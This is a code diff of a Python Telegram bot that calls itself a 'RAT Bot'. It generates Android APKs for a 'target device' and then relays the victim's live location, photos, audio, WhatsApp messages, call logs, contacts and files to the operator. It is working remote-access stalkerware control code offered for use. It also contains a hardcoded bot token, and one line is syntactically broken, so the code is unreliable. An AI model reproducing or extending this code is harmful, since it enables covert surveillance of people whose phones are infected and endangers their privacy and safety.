@@ -8,21 +8,24 @@ from database import DeviceDatabase
 from apk_generator import APKGenerator
 
 # ========== CONFIGURATION ==========
-# Added fallback to avoid crashes if env variables are missing
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8809232639:AAE2jRVr-EzDgvB69XdGQv_MtgrZsmA_37k')
 ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '7420647897')
+OWNER_TELEGRAM = "https://t.me/Nawab_Zada_Hacker_007"
 # ===================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
 db = DeviceDatabase()
 apk_gen = APKGenerator()
 
-# Removed Flask app as Polling is more reliable for this type of deployment
+# User Access System
+user_tokens = {}  # user_id: token
 
-WELCOME_MSG = """🎉 *Welcome To Nawab Zada Hacker RAT Bot!* 🎉
+WELCOME_MSG = f"""🎉 *Welcome To Nawab Zada Hacker RAT Bot!* 🎉
+
+👑 *Bot Owner:* [Nawab Zada Hacker]({OWNER_TELEGRAM})
 
 📱 *Features:*
-✅ Generate APK for any Android
+✅ Generate APK for any Android Version
 ✅ Live Location Tracking
 ✅ WhatsApp Messages Monitor
 ✅ Call Logs (Incoming/Outgoing)
@@ -41,23 +44,37 @@ Press /start to begin!"""
 @bot.message_handler(commands=['start'])
 def start(message):
     chat_id = message.chat.id
+    
+    if chat_id in user_tokens:
+        show_main_menu(chat_id)
+        return
+    
+    msg = bot.send_message(
+        chat_id,
+        "🔑 *Access Required*\n\nPlease send your Bot Token to get access.\n\nFormat: `TOKEN:your_bot_token`",
+        parse_mode='Markdown'
+    )
+    bot.register_next_step_handler(msg, process_user_token)
 
-    # Fixed: Ensure ADMIN_CHAT_ID is compared as an integer
-    try:
-        if chat_id != int(ADMIN_CHAT_ID):
-            bot.send_message(chat_id, "❌ Please contact admin to get access.")
-            return
-    except ValueError:
-        # If ADMIN_CHAT_ID is not a number, it allows access or handles error
-        pass
+def process_user_token(message):
+    chat_id = message.chat.id
+    text = message.text.strip()
+    
+    if text.startswith("TOKEN:"):
+        token = text.replace("TOKEN:", "").strip()
+        user_tokens[chat_id] = token
+        bot.send_message(chat_id, "✅ Access granted! Use /start again.")
+    else:
+        bot.send_message(chat_id, "❌ Invalid format. Use: TOKEN:your_bot_token")
 
+def show_main_menu(chat_id):
     markup = types.InlineKeyboardMarkup(row_width=2)
     btn1 = types.InlineKeyboardButton("📱 Generate APK", callback_data="gen_apk")
     btn2 = types.InlineKeyboardButton("📊 My Devices", callback_data="my_devices")
     btn3 = types.InlineKeyboardButton("🔍 All Features", callback_data="features")
     btn4 = types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
     markup.add(btn1, btn2, btn3, btn4)
-
+    
     bot.send_message(chat_id, WELCOME_MSG, parse_mode='Markdown', reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
@@ -75,8 +92,7 @@ def callback_handler(call):
     elif call.data.startswith("action_"):
         handle_device_action(call)
     elif call.data == "back":
-        # Fix: Start needs a message object
-        start(call.message)
+        show_main_menu(call.message.chat.id)
     elif call.data == "confirm":
         call.answer("Confirmed! ✅")
     else:
@@ -86,7 +102,7 @@ def handle_generate_apk(call):
     markup = types.InlineKeyboardMarkup()
     btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
     markup.add(btn)
-
+    
     msg = bot.send_message(
         call.message.chat.id,
         "📱 *Enter APK Name* (e.g., MyScanner):\n\n⚠️ Only letters and numbers",
@@ -98,29 +114,33 @@ def handle_generate_apk(call):
 def process_apk_name(message):
     apk_name = message.text.strip()
     chat_id = message.chat.id
-
+    
     if not apk_name or not apk_name.replace(' ', '').isalnum():
         bot.send_message(chat_id, "❌ Invalid name! Use only letters and numbers.")
         return
-
+    
     try:
         apk_url = apk_gen.generate_apk(apk_name, chat_id)
+        
         bot.send_message(
             chat_id,
-            f"✅ *APK Generated Successfully!*\n\n📱 Name: {apk_name}\n🔗 Download: {apk_url}\n\n⚠️ Install on target device and allow ALL permissions!",
+            f"✅ *APK Generated Successfully!*\n\n📱 Name: `{apk_name}.apk`\n🔗 Download: {apk_url}\n\n⚠️ Install on target device and allow ALL permissions!\n\n📲 After installation, device will appear in 'My Devices'",
             parse_mode='Markdown'
         )
     except Exception as e:
-        bot.send_message(chat_id, f"❌ Error generating APK: {e}")
+        bot.send_message(chat_id, f"❌ Error generating APK: {str(e)}")
 
 def handle_my_devices(call):
     chat_id = call.message.chat.id
     devices_list = db.get_devices(chat_id)
-
+    
     if not devices_list:
-        bot.send_message(chat_id, "📭 No devices connected yet.\n\nInstall APK on target device first.")
+        bot.send_message(
+            chat_id,
+            "📭 No devices connected yet.\n\nGenerate APK and install on target device first."
+        )
         return
-
+    
     markup = types.InlineKeyboardMarkup()
     for dev in devices_list:
         btn = types.InlineKeyboardButton(
@@ -128,20 +148,20 @@ def handle_my_devices(call):
             callback_data=f"dev_{dev['device_id']}"
         )
         markup.add(btn)
-
+    
     back_btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
     markup.add(back_btn)
-
+    
     bot.send_message(chat_id, "📱 *Your Connected Devices:*", parse_mode='Markdown', reply_markup=markup)
 
 def handle_device_menu(call):
     dev_id = call.data.replace("dev_", "")
     device = db.get_device(dev_id)
-
+    
     if not device:
         bot.send_message(call.message.chat.id, "❌ Device not found.")
         return
-
+    
     markup = types.InlineKeyboardMarkup(row_width=2)
     btn1 = types.InlineKeyboardButton("📍 Live Location", callback_data=f"action_loc_{dev_id}")
     btn2 = types.InlineKeyboardButton("📸 Camera", callback_data=f"action_cam_{dev_id}")
@@ -153,9 +173,9 @@ def handle_device_menu(call):
     btn8 = types.InlineKeyboardButton("📞 Contacts", callback_data=f"action_contacts_{dev_id}")
     btn9 = types.InlineKeyboardButton("📊 Device Info", callback_data=f"action_info_{dev_id}")
     btn10 = types.InlineKeyboardButton("🔙 Back", callback_data="my_devices")
-
+    
     markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10)
-
+    
     info = f"""📱 *Device Info:*
 🆔 ID: {device['device_id']}
 📛 Name: {device['name']}
@@ -172,39 +192,47 @@ def handle_device_action(call):
     dev_id = parts[-1]
     chat_id = call.message.chat.id
     device = db.get_device(dev_id)
-
+    
     if not device:
         bot.send_message(chat_id, "❌ Device not found.")
         return
-
+    
     if action == "loc":
         location = device.get('location', {})
         if location:
-            bot.send_location(chat_id, location.get('lat', 0), location.get('lon', 0))
-            bot.send_message(chat_id, f"📍 *Live Location*\nLatitude: {location.get('lat')}\nLongitude: {location.get('lon')}\nAccuracy: {location.get('accuracy', 'Unknown')}m", parse_mode='Markdown')
+            bot.send_location(chat_id, location.get('lat', 0), location.get('lon', App'))
+            bot.send_message(
+                chat_id,
+                f"📍 *Live Location*\nLatitude: {location.get('lat')}\nLongitude: {location.get('lon')}\nAccuracy: {location.get('accuracy', 'Unknown')}m",
+                parse_mode='Markdown'
+            )
         else:
             bot.send_message(chat_id, "📍 Location not available.")
-
+    
     elif action == "cam":
         bot.send_message(chat_id, "📸 Taking photo from device...")
         photos = device.get('photos', [])
         if photos:
             for photo_url in photos[-5:]:
-                try: bot.send_photo(chat_id, photo_url)
-                except: pass
+                try:
+                    bot.send_photo(chat_id, photo_url)
+                except:
+                    pass
         else:
             bot.send_message(chat_id, "📸 No photos captured yet.")
-
+    
     elif action == "mic":
         bot.send_message(chat_id, "🎤 Recording audio from device...")
         audio_files = device.get('audio', [])
         if audio_files:
             for audio_url in audio_files[-3:]:
-                try: bot.send_audio(chat_id, open(audio_url, 'rb'))
-                except: pass
+                try:
+                    bot.send_audio(chat_id, audio_url)
+                except:
+                    pass
         else:
             bot.send_message(chat_id, "🎤 No audio recordings yet.")
-
+    
     elif action == "whatsapp":
         messages = device.get('whatsapp_messages', [])
         if messages:
@@ -214,7 +242,7 @@ def handle_device_action(call):
             bot.send_message(chat_id, msg_text[:4000], parse_mode='Markdown')
         else:
             bot.send_message(chat_id, "💬 No WhatsApp messages yet.")
-
+    
     elif action == "calls":
         calls = device.get('call_logs', [])
         if calls:
@@ -224,7 +252,7 @@ def handle_device_action(call):
             bot.send_message(chat_id, msg_text, parse_mode='Markdown')
         else:
             bot.send_message(chat_id, "📞 No call logs yet.")
-
+    
     elif action == "files":
         files = device.get('files', [])
         if files:
@@ -234,7 +262,7 @@ def handle_device_action(call):
             bot.send_message(chat_id, msg_text, parse_mode='Markdown')
         else:
             bot.send_message(chat_id, "📁 No files found.")
-
+    
     elif action == "apps":
         apps = device.get('apps', [])
         if apps:
@@ -244,7 +272,7 @@ def handle_device_action(call):
             bot.send_message(chat_id, msg_text, parse_mode='Markdown')
         else:
             bot.send_message(chat_id, "📱 No apps found.")
-
+    
     elif action == "contacts":
         contacts = device.get('contacts', [])
         if contacts:
@@ -254,7 +282,7 @@ def handle_device_action(call):
             bot.send_message(chat_id, msg_text, parse_mode='Markdown')
         else:
             bot.send_message(chat_id, "📞 No contacts found.")
-
+    
     elif action == "info":
         info = f"""📱 *Full Device Info:*
 🆔 Device ID: {device['device_id']}
@@ -268,11 +296,13 @@ def handle_device_action(call):
 🕐 Last Seen: {device.get('last_seen', 'Never')}
 """
         bot.send_message(chat_id, info, parse_mode='Markdown')
-
+    
     call.answer()
 
 def handle_features(call):
-    features = """🎯 *Bot Features:*
+    features = f"""🎯 *Bot Features:*
+
+👑 *Owner:* [Nawab Zada Hacker]({OWNER_TELEGRAM})
 
 📱 *Device Monitoring:*
 • Live Location Tracking
@@ -307,8 +337,13 @@ def handle_settings(call):
     btn2 = types.InlineKeyboardButton("🆔 Set Chat ID", callback_data="set_chatid")
     btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="back")
     markup.add(btn1, btn2, btn3)
-
-    bot.send_message(call.message.chat.id, "⚙️ *Settings*:\n\nConfigure your bot settings below:", parse_mode='Markdown', reply_markup=markup)
+    
+    bot.send_message(
+        call.message.chat.id,
+        f"⚙️ *Settings*\n\n👑 Owner: [Nawab Zada Hacker]({OWNER_TELEGRAM})\n\nConfigure your bot settings below:",
+        parse_mode='Markdown',
+        reply_markup=markup
+    )
 
 @bot.message_handler(func=lambda m: m.text.startswith("DATA:"))
 def receive_device_data(message):
@@ -320,6 +355,6 @@ def receive_device_data(message):
         print(f"Error receiving data: {e}")
 
 if __name__ == '__main__':
-    print("Starting bot via Polling...")
-    # This is the key fix: using polling instead of webhook for Railway deployment
+    print("Starting Nawab Zada Hacker RAT Bot...")
+    print(f"Owner: {OWNER_TELEGRAM}")
     bot.infinity_polling()
